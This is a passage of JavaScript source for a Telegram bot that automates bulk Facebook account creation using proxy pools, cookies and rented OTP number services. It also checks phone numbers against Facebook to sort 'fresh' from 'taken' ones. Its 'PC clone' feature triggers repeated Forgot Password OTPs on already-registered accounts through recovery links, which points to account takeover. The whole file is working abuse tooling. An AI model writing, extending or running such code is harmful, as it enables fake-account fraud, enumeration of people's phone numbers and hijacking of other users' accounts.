      writeUserProxies(uid, next);
      await sendMessage(chatId, `✅ Proxy removed. Remaining proxies: <code>${next.length}</code>.`);
      await renderProxiesMenu(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_cookies') {
      promptSessions.delete(uid);
      const saved = writeUserCookies(uid, text);
      await sendMessage(chatId, `✅ Base cookies saved & normalized:\n<blockquote><code>${escapeHtml(saved)}</code></blockquote>`);
      await renderCookiesMenu(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_cc') {
      const cleanCc = text.replace(/\D/g, '');
      if (!cleanCc || cleanCc.length > 4) {
        await sendMessage(chatId, '❌ Invalid country code. Send digits only (e.g. <code>880</code>, <code>91</code>, <code>1</code>):', {
          inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { cc: cleanCc });
      await sendMessage(chatId, `✅ Country code updated to <code>+${escapeHtml(cleanCc)}</code>.`);
      await renderSettings(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_password') {
      if (text.length < 6) {
        await sendMessage(chatId, '❌ Password must be at least 6 characters. Try again:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { password: text });
      await sendMessage(chatId, `✅ Default account password updated (${text.length} chars).`);
      await renderSettings(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_default_proxy') {
      if (text === '-') {
        promptSessions.delete(uid);
        writeUserConfig(uid, { proxy: '' });
        await sendMessage(chatId, '✅ Default proxy cleared.');
        await renderSettings(chatId, uid);
        return;
      }
      const normPx = validateProxyUrl(text);
      if (!normPx) {
        await sendMessage(
          chatId,
          `❌ Invalid proxy format. Try:\n• <code>user:pass:host:port</code>\n• <code>host:port:user:pass</code>\n• <code>http://user:pass@ip:port</code>\n• <code>socks5://ip:port</code>\nOr send <code>-</code> to clear:`,
          { inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]] }
        );
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { proxy: normPx });
      await sendMessage(chatId, `✅ Default proxy set to <code>${escapeHtml(normPx)}</code>`);
      await renderSettings(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_delay') {
      const sec = Number(text);
      if (!Number.isFinite(sec) || sec < 0 || sec > 3600) {
        await sendMessage(chatId, '❌ Enter a valid delay between <code>0</code> and <code>3600</code> seconds:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { delay: Math.floor(sec) });
      await sendMessage(chatId, `✅ Delay updated to <code>${Math.floor(sec)}s</code>.`);
      await renderSettings(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_batch') {
      const b = Number(text);
      if (!Number.isFinite(b) || b < 0 || b > 500) {
        await sendMessage(chatId, '❌ Enter batch size (<code>0</code> = off, or <code>1–500</code>):', {
          inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { batch: Math.floor(b) });
      await sendMessage(chatId, `✅ Batch break size updated to <code>${Math.floor(b)}</code>.`);
      await renderSettings(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_retries') {
      const rt = Number(text);
      if (!Number.isFinite(rt) || rt < 2 || rt > 12) {
        await sendMessage(chatId, '❌ Enter retries between <code>2</code> and <code>12</code>:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { retries: Math.floor(rt) });
      await sendMessage(chatId, `✅ Retries updated to <code>${Math.floor(rt)}</code>.`);
      await renderSettings(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_timeout') {
      const to = Number(text);
      if (!Number.isFinite(to) || to < 5 || to > 120) {
        await sendMessage(chatId, '❌ Enter timeout between <code>5</code> and <code>120</code> seconds:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { timeout: Math.floor(to) });
      await sendMessage(chatId, `✅ Request timeout updated to <code>${Math.floor(to)}s</code>.`);
      await renderSettings(chatId, uid);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_broadcast') {
      promptSessions.delete(uid);
      const sent = await broadcastMessage(text);
      await sendMessage(chatId, `📣 Broadcast delivered to <code>${sent}</code> approved users.`);
      await renderAdminHome(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_global_proxies') {
      promptSessions.delete(uid);
      const additions = parseProxyLines(text);
      if (additions.length === 0) {
        await sendMessage(chatId, '❌ No valid proxies recognized. Supported: <code>user:pass:host:port</code>, <code>http://user:pass@ip:port</code>, <code>socks5://ip:port</code>.', {
          inline_keyboard: [[btnOk('➕ Try Again', 'admin:px_add'), btnBad('❌ Cancel', 'admin:proxies')]],
        });
        return;
      }
      writeGlobalProxies([...readGlobalProxies(), ...additions]);
      await sendMessage(chatId, `✅ Added <code>${additions.length}</code> proxies. Global pool now has <code>${readGlobalProxies().length}</code> proxies.`);
      await renderAdminGlobalProxies(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_default_limit') {
      const lim = Number(text);
      if (!Number.isFinite(lim) || lim < 1 || lim > 100000) {
        await sendMessage(chatId, '❌ Enter a limit between <code>1</code> and <code>100000</code>:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:settings')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeSettings({ defaultDailyLimit: Math.floor(lim) });
      await sendMessage(chatId, `✅ Default daily limit updated to <code>${Math.floor(lim)}</code>.`);
      await renderAdminSettings(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_welcome') {
      promptSessions.delete(uid);
      writeSettings({ welcomeNote: text.slice(0, 300) });
      await sendMessage(chatId, `✅ Welcome note updated.`);
      await renderAdminBrandMenu(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_brand') {
      const cleanBrand = text.trim().slice(0, 40);
      if (!cleanBrand) {
        await sendMessage(chatId, '❌ Enter a valid brand name (1-40 chars):', {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:brand')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeSettings({ brandName: cleanBrand });
      await sendMessage(chatId, `✅ Brand name updated to <code>${escapeHtml(cleanBrand)}</code>.`);
      await renderAdminBrandMenu(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_owner') {
      const norm = normalizeTgLink(text, DEFAULT_OWNER_URL);
      promptSessions.delete(uid);
      writeSettings({ adminUsername: norm.handle, ownerUrl: norm.url });
      await sendMessage(chatId, `✅ Owner updated to ${escapeHtml(norm.handle)} (<code>${escapeHtml(norm.url)}</code>).`);
      await renderAdminBrandMenu(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_channel') {
      const norm = normalizeTgLink(text, DEFAULT_CHANNEL_URL);
      promptSessions.delete(uid);
      writeSettings({ channelUrl: norm.url });
      await sendMessage(chatId, `✅ Channel updated to <code>${escapeHtml(norm.url)}</code>.`);
      await renderAdminBrandMenu(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_find_user') {
      promptSessions.delete(uid);
      const q = text.trim().replace(/^@/, '').toLowerCase();
      const users = Object.values(readUsersMap());
      const matches = users.filter(
        (u) =>
          u.id === q ||
          (u.username && u.username.toLowerCase().includes(q)) ||
          (u.firstName && u.firstName.toLowerCase().includes(q))
      );
      if (matches.length === 1) {
        await renderAdminUserDetail(chatId, matches[0].id);
      } else if (matches.length > 1) {
        const rows = matches.slice(0, 8).map((u) => [btnNav(`${u.firstName} (${u.id})`, `admin:uview:${u.id}`)]);
        rows.push([btnNav('⬅️ Back to Users', 'admin:users')]);
        await sendMessage(chatId, `🔍 <b>FOUND ${matches.length} USERS</b>\n${DIVIDER}\nSelect a user:`, { inline_keyboard: rows });
      } else {
        await sendMessage(chatId, `❌ No user matched <code>${escapeHtml(text)}</code>.`, {
          inline_keyboard: [[btnNav('🔍 Try Again', 'admin:ufind'), btnNav('⬅️ Users List', 'admin:users')]],
        });
      }
      return;
    }

    if (session.kind === 'awaiting_voltx_key') {
      const cleanKey = text.trim();
      if (cleanKey === '-') {
        promptSessions.delete(uid);
        writeUserConfig(uid, { voltx_api_key: '' });
        await sendMessage(chatId, '✅ Personal Voltx API key cleared.');
        await renderVoltxMenu(chatId, uid);
        return;
      }
      if (cleanKey.length < 5 || /\s/.test(cleanKey)) {
        await sendMessage(chatId, '❌ Invalid API key format. Paste your Voltx <code>mauthapi</code> key (no spaces) or send <code>-</code> to clear:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'menu:voltx')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { voltx_api_key: cleanKey });
      voltxRangeCache.delete(uid);
      await sendMessage(chatId, `✅ Voltx API key saved (<code>${escapeHtml(maskSecretKey(cleanKey))}</code>).`);
      await renderVoltxMenu(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_voltx_rid') {
      const cleanRid = normalizeVoltxRid(text);
      if (!cleanRid || cleanRid.length < 2) {
        await sendMessage(chatId, '❌ Invalid Range ID. Send digits (e.g. <code>26134</code> or <code>22501XXX</code>):', {
          inline_keyboard: [[btnBad('❌ Cancel', 'menu:voltx')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { voltx_last_rid: cleanRid, voltx_last_range: text.trim() });
      await renderVoltxMenu(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_voltx_count') {
      const n = Number(text);
      if (!Number.isInteger(n) || n < 1 || n > 50) {
        await sendMessage(chatId, '❌ Enter an account count between <code>1</code> and <code>50</code>:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'menu:voltx')]],
        });
        return;
      }
      promptSessions.delete(uid);
      const cfgNow = readUserConfig(uid);
      await startVoltxAutoRun(chatId, user, cfgNow.voltx_last_rid, n);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_voltx_key') {
      const cleanKey = text.trim();
      promptSessions.delete(uid);
      if (cleanKey === '-') {
        writeSettings({ defaultVoltxKey: '' });
        await sendMessage(chatId, '✅ Global default Voltx API key cleared.');
      } else {
        writeSettings({ defaultVoltxKey: cleanKey });
        await sendMessage(chatId, `✅ Global default Voltx API key saved (<code>${escapeHtml(maskSecretKey(cleanKey))}</code>).`);
      }
      await renderAdminSettings(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_dm') {
      const targetId = session.targetUserId;
      promptSessions.delete(uid);
      const stNow = readSettings();
      const sent = await sendMessage(
        targetId,
        `📩 <b>MESSAGE FROM ${escapeHtml(stNow.brandName || DEFAULT_BRAND_NAME)} ADMIN</b>\n${DIVIDER}\n<blockquote>${escapeHtml(text)}</blockquote>`,
        {
          inline_keyboard: [
            [
              btnUrl('👑 Contact Owner', stNow.ownerUrl || DEFAULT_OWNER_URL, 'success'),
              btnNav('⬅️ Main Menu', 'menu:home'),
            ],
          ],
        }
      );
      await sendMessage(chatId, sent.ok ? `✅ DM delivered to <code>${escapeHtml(targetId)}</code>.` : `❌ Failed to DM user (<code>${escapeHtml(sent.description || 'blocked/unreachable')}</code>).`, {
        inline_keyboard: [[btnNav('⬅️ User Profile', `admin:uview:${targetId}`)]],
      });
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_user_limit') {
      const lim = Number(text);
      if (!Number.isFinite(lim) || lim < 0 || lim > 100000) {
        await sendMessage(chatId, '❌ Enter a limit between <code>0</code> and <code>100000</code>:', {
          inline_keyboard: [[btnBad('❌ Cancel', `admin:uview:${session.targetUserId}`)]],
        });
        return;
      }
      promptSessions.delete(uid);
      const map = readUsersMap();
      if (map[session.targetUserId]) {
        map[session.targetUserId].dailyLimit = Math.floor(lim);
        writeUsersMap(map);
      }
      await sendMessage(chatId, `✅ User <code>${escapeHtml(session.targetUserId)}</code> daily limit set to <code>${Math.floor(lim)}</code>.`);
      await renderAdminUserDetail(chatId, session.targetUserId);
    }
  }

  async function processCallback(cb) {
    tgCall('answerCallbackQuery', { callback_query_id: cb.id }, undefined, { noRetry: true }).catch(() => {});
    if (!cb.message) return;
    const chatId = cb.message.chat.id;
    const msgId = cb.message.message_id;
    const st = readSettings();
    const user = getOrCreateUser(cb.from);
    const uid = user.id;
    const isAdmin = isUserAdmin(user, st);
    const data = cb.data || '';

    if (data === 'menu:home' || data === 'prompt:cancel') {
      promptSessions.delete(uid);
      await renderHome(chatId, cb.from, msgId);
      return;
    }

    if (st.maintenanceMode && !isAdmin) {
      await renderHome(chatId, cb.from, msgId);
      return;
    }

    if (user.status === 'blocked' || (user.status !== 'approved' && !isAdmin)) {
      await renderHome(chatId, cb.from, msgId);
      return;
    }

    if (!isAdmin && st.requireChannelJoin) {
      const ch = await checkChannelMembership(uid, st);
      if (!ch.ok) {
        await renderHome(chatId, cb.from, msgId);
        return;
      }
    }

    if (data === 'menu:help') {
      promptSessions.delete(uid);
      await renderHelpMenu(chatId, isAdmin, st, msgId);
      return;
    }

    if (data === 'menu:run') {
      await renderRunPrompt(chatId, uid, msgId);
      return;
    }

    if (data === 'run:toggle_resume') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { resume_mode: cfg.resume_mode === false });
      await renderRunPrompt(chatId, uid, msgId);
      return;
    }

    if (data === 'run:toggle_gql') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { precheck_gql: cfg.precheck_gql === false });
      await renderRunPrompt(chatId, uid, msgId);
      return;
    }

    if (data === 'run:turbo') {
      writeUserConfig(uid, { delay: 0, batch: 0, retries: 3, timeout: 15, threads: 6 });
      await renderRunPrompt(chatId, uid, msgId);
      return;
    }

    if (data === 'run:cycle_threads') {
      const cfg = readUserConfig(uid);
      const order = [1, 2, 3, 4, 5, 6, 8];
      const cur = order.indexOf(Number(cfg.threads ?? 4));
      const next = order[(cur + 1) % order.length];
      writeUserConfig(uid, { threads: next });
      await renderRunPrompt(chatId, uid, msgId);
      return;
    }

    if (data === 'run:clear_done') {
      clearUserDone(uid);
      await sendMessage(chatId, `🧹 Cleared your processed numbers (<code>done.txt</code>) history.`);
      await renderHome(chatId, cb.from);
      return;
    }

    if (data === 'menu:stats') {
      promptSessions.delete(uid);
      const accounts = readUserAccounts(uid);
      const pending = readUserPending(uid);
      const doneCnt = readUserDone(uid).size;
      const pxCnt = readUserProxies(uid).length;
      const ok = accounts.filter((a) => a.status === 'OK').length;
      const used = accounts.filter((a) => a.status === 'USED').length;
      const limit = accounts.filter((a) => a.status === 'LIMIT').length;
      const fail = accounts.filter((a) => a.status === 'FAIL' || a.status === 'BADNUM').length;
      const quotaBar = renderProgressBar(user.usedToday, user.dailyLimit, 10);
      const totalTried = ok + used + limit + fail;
      const successRate = totalTried > 0 ? Math.round((ok / totalTried) * 100) : 0;

      await editMessage(
        chatId,
        msgId,
        [
          `📊 <b>PERSONAL ANALYTICS & STATS</b>`,
          DIVIDER,
          `🆔 <b>ID:</b> <code>${escapeHtml(uid)}</code> (${user.role.toUpperCase()})`,
          `🎯 <b>Today's Quota:</b> <code>${user.usedToday} / ${user.dailyLimit}</code>`,
          `<code>${quotaBar}</code>`,
          ``,
          `<b>Account Outcomes (${successRate}% Ready Rate)</b>`,
          `├ ✅ <b>Ready Accounts:</b> <code>${ok}</code>`,
          `├ 🔐 <b>Pending OTP Queue:</b> <code>${pending.length}</code>`,
          `├ ⚠️ <b>Used:</b> <code>${used}</code>  •  ⏳ <b>Limit:</b> <code>${limit}</code>  •  ❌ <b>Fail:</b> <code>${fail}</code>`,
          `└ ✔️ <b>Done History:</b> <code>${doneCnt}</code>  •  🌐 <b>Proxies:</b> <code>${pxCnt}</code>`,
        ].join('\n'),
        {
          inline_keyboard: [
            [
              btnOk('📦 Accounts Vault', 'menu:accounts'),
              btnOk('🔄 Refresh', 'menu:stats'),
            ],
            [btnNav('⬅️ Back to Menu', 'menu:home')],
          ],
        }
      );
      return;
    }

    if (data === 'menu:logs') {
      promptSessions.delete(uid);
      await renderLogsMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'logs:html') {
      const files = getUserFiles(uid);
      const body = fs.existsSync(files.debugHtml) ? fs.readFileSync(files.debugHtml, 'utf-8') : '';
      if (!body.trim()) await sendMessage(chatId, 'No debug HTML saved yet.', { inline_keyboard: [[btnNav('⬅️ Back to Logs', 'menu:logs')]] });
      else await sendDocumentText(chatId, `last_debug_${uid}.html`, body, 'Last captured Facebook response HTML');
      return;
    }

    if (data === 'logs:clear') {
      clearUserLogs(uid);
      await editMessage(chatId, msgId, `🧹 <b>Debug Logs Cleared</b>\nAll recent attempt logs have been wiped.`, {
        inline_keyboard: [[btnNav('⬅️ Back to Menu', 'menu:home')]],
      });
      return;
    }

    if (data === 'menu:pc_clone') {
      promptSessions.delete(uid);
      await renderPcCloneMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'pc:links') {
      promptSessions.delete(uid);
      await renderPcCloneLinksMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'pc:links_reset') {
      promptSessions.delete(uid);
      writeUserConfig(uid, { pc_recovery_urls: PC_RECOVERY_PRESETS.slice(0, 4).map((p) => p.url) });
      await renderPcCloneLinksMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'pc:links_custom') {
      promptSessions.set(uid, { kind: 'awaiting_pc_links' });
      await sendMessage(
        chatId,
        [
          `📝 <b>SUGGEST / SET FACEBOOK RECOVERY LINKS</b>`,
          DIVIDER,
          `Paste one or multiple Facebook links (one per line) that receive OTP best:`,
          `• <code>https://www.facebook.com/login/</code>`,
          `• <code>https://m.facebook.com/login/</code>`,
          `• <code>https://www.facebook.com/login/identify/</code>`,
          `• <code>https://www.facebook.com/hacked/</code>`,
        ].join('\n'),
        { inline_keyboard: [[btnBad('❌ Cancel', 'pc:links')]] }
      );
      return;
    }

    if (data.startsWith('pc:links_toggle:')) {
      const pid = data.slice('pc:links_toggle:'.length);
      const preset = PC_RECOVERY_PRESETS.find((p) => p.id === pid);
      if (preset) {
        const cur = normalizePcRecoveryUrls(readUserConfig(uid).pc_recovery_urls, { fallbackToDefaults: true });
        let next;
        if (cur.includes(preset.url)) {
          next = cur.filter((u) => u !== preset.url);
          if (next.length === 0) next = [preset.url];
        } else {
          next = [preset.url, ...cur].slice(0, 8);
        }
        writeUserConfig(uid, { pc_recovery_urls: next });
      }
      await renderPcCloneLinksMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'pc:set_lamix') {
      promptSessions.set(uid, { kind: 'awaiting_lamix_token' });
      await sendMessage(
        chatId,
        `🔑 <b>SET LAMIX API v1 TOKEN</b>\n${DIVIDER}\nPaste your Lamix Bearer token from <code>panel.lamix.org</code> (or send <code>-</code> to clear):`,
        { inline_keyboard: [[btnBad('❌ Cancel', 'menu:pc_clone')]] }
      );
      return;
    }

    if (data === 'pc:set_resends') {
      const curR = Number(readUserConfig(uid).pc_otp_resends ?? 3);
      promptSessions.set(uid, { kind: 'awaiting_pc_resends' });
      const rBtn = (n) => (curR === n ? btnOk(`✅ ${n}x`, `pc:resends:${n}`) : btnNav(`${n}x`, `pc:resends:${n}`));
      await sendMessage(
        chatId,
        `🔁 <b>PC CLONE FORGOT OTP REPEATS (1–10x)</b>\n${DIVIDER}\nPick how many times Forgot Password OTP is triggered per Taken FB account (or type <code>1–10</code>):`,
        {
          inline_keyboard: [
            [rBtn(1), rBtn(2), rBtn(3), rBtn(5)],
            [rBtn(7), rBtn(8), rBtn(10)],
            [btnBad('❌ Cancel', 'menu:pc_clone')],
          ],
        }
      );
      return;
    }

    if (data.startsWith('pc:resends:')) {
      const n = Math.max(1, Math.min(10, Number(data.slice('pc:resends:'.length)) || 3));
      promptSessions.delete(uid);
      writeUserConfig(uid, { pc_otp_resends: n });
      await renderPcCloneMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'menu:normalize') {
      const cfg = readUserConfig(uid);
      promptSessions.set(uid, { kind: 'awaiting_gqlcheck' });
      await sendMessage(
        chatId,
        [
          `🔍 <b>FB CHECKER &amp; NUMBER SPLITTER (UP TO 1,000)</b>`,
          DIVIDER,
          `⚡ <b>Route:</b> <code>${cfg.checker_use_proxy ? '🌐 PROXY POOL' : '⚡ DIRECT TOKEN (0 Proxy Cost)'}</code>`,
          `Paste phone numbers (up to <b>1,000</b>) or upload a <code>.txt</code> file to split <b>Fresh</b> vs <b>Taken</b> (Fallback CC: <code>+${escapeHtml(cfg.cc)}</code>):`,
        ].join('\n'),
        {
          inline_keyboard: [
            [btnNav(cfg.checker_use_proxy ? '🌐 Mode: PROXY POOL' : '⚡ Mode: DIRECT (0 PX)', 'checker:toggle_mode')],
            [btnBad('❌ Cancel', 'prompt:cancel')],
          ],
        }
      );
      return;
    }

    if (data === 'checker:toggle_mode') {
      const cfg = readUserConfig(uid);
      const nextCfg = writeUserConfig(uid, { checker_use_proxy: !cfg.checker_use_proxy });
      if (promptSessions.get(uid)?.kind === 'awaiting_gqlcheck') {
        await editMessage(
          chatId,
          msgId,
          [
            `🔍 <b>FB CHECKER &amp; NUMBER SPLITTER (UP TO 1,000)</b>`,
            DIVIDER,
            `⚡ <b>Route:</b> <code>${nextCfg.checker_use_proxy ? '🌐 PROXY POOL' : '⚡ DIRECT TOKEN (0 Proxy Cost)'}</code>`,
            `Paste phone numbers (up to <b>1,000</b>) or upload a <code>.txt</code> file to split <b>Fresh</b> vs <b>Taken</b> (Fallback CC: <code>+${escapeHtml(nextCfg.cc)}</code>):`,
          ].join('\n'),
          {
            inline_keyboard: [
              [btnNav(nextCfg.checker_use_proxy ? '🌐 Mode: PROXY POOL' : '⚡ Mode: DIRECT (0 PX)', 'checker:toggle_mode')],
              [btnBad('❌ Cancel', 'prompt:cancel')],
            ],
          }
        );
      } else {
        await sendMessage(
          chatId,
          `✅ FB Checker mode switched to <b>${nextCfg.checker_use_proxy ? '🌐 PROXY POOL' : '⚡ DIRECT TOKEN (0 Proxy Cost)'}</b>.`,
          { inline_keyboard: [[btnOk('🔍 Open FB Checker', 'menu:normalize'), btnNav('⬅️ Main Menu', 'menu:home')]] }
        );
      }
      return;
    }

    if (data === 'norm:run_cached') {
      const list = normalizedCache.get(uid) || [];
      normalizedCache.delete(uid);
      if (list.length === 0) {
        await sendMessage(chatId, '⚠️ Cached list expired. Please paste numbers again.', {
          inline_keyboard: [[btnOk('🔢 Normalize Again', 'menu:normalize'), btnNav('⬅️ Main Menu', 'menu:home')]],
        });
        return;
      }
      await startUserBatchRun(chatId, user, '', list);
      return;
    }

    if (data === 'norm:gqlcheck') {
      const list = normalizedCache.get(uid) || [];
      if (list.length === 0) {
        await sendMessage(chatId, '⚠️ Cached list expired. Please paste numbers again.', {
          inline_keyboard: [[btnOk('🔢 Normalize Again', 'menu:normalize'), btnNav('⬅️ Main Menu', 'menu:home')]],
        });
        return;
      }
      await runGraphqlBatchCheck(chatId, uid, list);
      return;
    }

    if (data === 'norm:run_free') {
      const freeList = normalizedFreeCache.get(uid) || [];
      normalizedFreeCache.delete(uid);
      if (freeList.length === 0) {
        await sendMessage(chatId, '⚠️ No cached FREE numbers found. Run /check or Normalize again.', {
          inline_keyboard: [[btnOk('🔢 Normalize Again', 'menu:normalize'), btnNav('⬅️ Main Menu', 'menu:home')]],
        });
        return;
      }
      await startUserBatchRun(chatId, user, '', freeList);
      return;
    }

    if (data === 'gql:dl_free') {
      const freeList = normalizedFreeCache.get(uid) || [];
      if (freeList.length === 0) {
        await sendMessage(chatId, '⚠️ No cached fresh numbers. Run GraphQL check again.');
        return;
      }
      const body = freeList.map((n) => `+${n}`).join('\n');
      await sendDocumentText(chatId, `fresh_numbers_${uid}.txt`, body, `Fresh Available Numbers (${freeList.length})`);
      return;
    }

    if (data === 'gql:dl_taken') {
      const takenList = normalizedTakenCache.get(uid) || [];
      if (takenList.length === 0) {
        await sendMessage(chatId, '⚠️ No cached taken numbers. Run GraphQL check again.');
        return;
      }
      const body = takenList.map((n) => `+${n}`).join('\n');
      await sendDocumentText(chatId, `taken_numbers_${uid}.txt`, body, `Taken Registered Numbers (${takenList.length})`);
      return;
    }

    if (data === 'menu:otp') {
      promptSessions.delete(uid);
      await renderOtpQueue(chatId, uid, msgId);
      return;
    }

    if (data === 'otp:voltx_sync') {
      promptSessions.delete(uid);
      await syncVoltxOtpsForPending(chatId, uid);
      return;
    }

    if (data === 'otp:lamix_sync') {
      promptSessions.delete(uid);
      await syncLamixOtpsForPending(chatId, uid);
      return;
    }

    if (data === 'otp:manual') {
      promptSessions.set(uid, { kind: 'awaiting_manual_otp' });
      await sendMessage(
        chatId,
        [
          `➕ <b>ADD MANUAL OTP SESSION</b>`,
          DIVIDER,
          `Send session details in format:`,
          `<code>phone|Profile Name|confirm_url</code>`,
          ``,
          `<blockquote>Example:\n<code>8801712345678|Hasan Mia|https://m.facebook.com/confirmphone.php</code></blockquote>`,
        ].join('\n'),
        { inline_keyboard: [[btnBad('❌ Cancel', 'menu:otp')]] }
      );
      return;
    }

    if (data === 'otp:clearall') {
      writeUserPending(uid, []);
      await renderOtpQueue(chatId, uid, msgId);
      return;
    }

    if (data.startsWith('otp:inspect:')) {
      const phone = data.slice('otp:inspect:'.length);
      const item = readUserPending(uid).find((p) => p.phone === phone);
      if (!item) {
        await sendMessage(chatId, 'Session not found.', {
          inline_keyboard: [[btnNav('⬅️ OTP Queue', 'menu:otp')]],
        });
        return;
      }
      const det = detectCountryFromNumber(`+${item.phone}`, '880', item.country || '');
      const iso = item.iso || (det?.iso && det.iso !== '??' ? det.iso : '??');
      const cname = item.country || det?.name || 'Unknown';
      const flds = Object.keys(item.fields || {}).join(', ') || 'none';
      const ccnt = Object.keys(item.cookies || {}).length;
      await sendMessage(
        chatId,
        [
          `🔍 <b>OTP SESSION DETAILS</b>`,
          DIVIDER,
          `📱 <b>Phone:</b> <code>+${escapeHtml(item.phone)}</code> (${escapeHtml(item.status)})`,
          `🌍 <b>Country:</b> ${escapeHtml(cname)} [<b>${escapeHtml(iso)}</b>]  •  🔁 <b>OTP Resends:</b> <code>${Number(item.resendCount || 0)}</code>`,
          `👤 <b>Profile:</b> ${escapeHtml(item.name)}  •  🔑 <b>Pass:</b> <code>${escapeHtml(item.pass || '-')}</code>`,
          `🌐 <b>Sticky Proxy:</b> <code>${escapeHtml(item.proxy || 'direct')}</code>`,
          `🔗 <b>Confirm URL:</b> <code>${escapeHtml(item.confirm_url || '-')}</code>`,
          `⚡ <b>Action:</b> <code>${escapeHtml(item.action || '-')}</code>`,
          `📝 <b>Fields:</b> <code>${escapeHtml(flds)}</code>  •  🍪 <b>Cookies:</b> <code>${ccnt}</code>`,
        ].join('\n'),
        {
          inline_keyboard: [
            [
              btnOk(`🔑 Enter OTP`, `otp:enter:${item.phone}`),
              btnNav(`🔁 Resend OTP`, `otp:resend:${item.phone}`),
            ],
            [
              btnNav(`🔎 Check Login`, `otp:check:${item.phone}`),
              btnBad('🗑 Delete', `otp:del:${item.phone}`),
              btnNav('⬅️ OTP Queue', 'menu:otp'),
            ],
          ],
        }
      );
      return;
    }

    if (data.startsWith('otp:resend:')) {
      const phone = data.slice('otp:resend:'.length);
      const items = readUserPending(uid);
      const item = items.find((p) => p.phone === phone);
      if (!item) {
        await sendMessage(chatId, 'Session not found in OTP queue.', {
          inline_keyboard: [[btnNav('⬅️ OTP Queue', 'menu:otp')]],
        });
        return;
      }
      const cfg = readUserConfig(uid);
      const userCookie = readUserCookies(uid);
      const det = detectCountryFromNumber(`+${item.phone}`, cfg.cc, item.country || '');
      const iso = item.iso || (det?.iso && det.iso !== '??' ? det.iso : getCountryInfo(cfg.cc)[1]);
      await sendMessage(
        chatId,
        `🔁 Resending OTP via sticky proxy [<b>${escapeHtml(iso)}</b>] for <code>+${escapeHtml(phone)}</code>...`
      );
      const resendRes = await performOtpResendOnce({ ...item }, cfg, userCookie);
      if (resendRes.alreadyConfirmed) {
        storeUserAccount(uid, {
          name: item.name,
          phone: item.phone,
          pass: item.pass || cfg.password || '',
          uid: resendRes.uid,
          status: 'OK',
          confirmed: true,
          cookies: resendRes.cookies,
        });
        writeUserPending(uid, items.filter((p) => p.phone !== phone));
        appendUserLog(uid, `OTP RESEND AUTO-CONFIRMED +${phone} -> UID ${resendRes.uid}`);
        await sendMessage(
          chatId,
          `✅ <b>Account Verified!</b>\nUID|Pass: <code>${escapeHtml(resendRes.uid)}|${escapeHtml(item.pass || cfg.password || '')}</code>`,
          { inline_keyboard: [[btnOk('📦 Accounts Vault', 'menu:accounts'), btnNav('🔐 OTP Queue', 'menu:otp')]] }
        );
        return;
      }
      if (resendRes.ok) {
        upsertUserPending(uid, resendRes.item);
        appendUserLog(uid, `MANUAL OTP RESEND +${phone} [${iso}] (${resendRes.resendCount}x) via ${resendRes.via}`);
        await sendMessage(
          chatId,
          [
            `✅ <b>OTP RESENT SUCCESSFULLY!</b>`,
            DIVIDER,
            `📱 <b>Number:</b> <code>+${escapeHtml(phone)}</code> [<b>${escapeHtml(iso)}</b>]`,
            `🔁 <b>Total Resends:</b> <code>${resendRes.resendCount}</code>  •  ⚡ <b>Method:</b> <code>${escapeHtml(resendRes.via)}</code>`,
            `🌐 <b>Sticky Proxy:</b> <code>${escapeHtml(resendRes.item.proxy || 'direct')}</code>`,
          ].join('\n'),
          {
            inline_keyboard: [
              [
                btnOk(`🔑 Enter OTP`, `otp:enter:${phone}`),
                btnNav(`🔁 Resend Again`, `otp:resend:${phone}`),
              ],
              [btnNav('⬅️ OTP Queue', 'menu:otp')],
            ],
          }
        );
      } else {
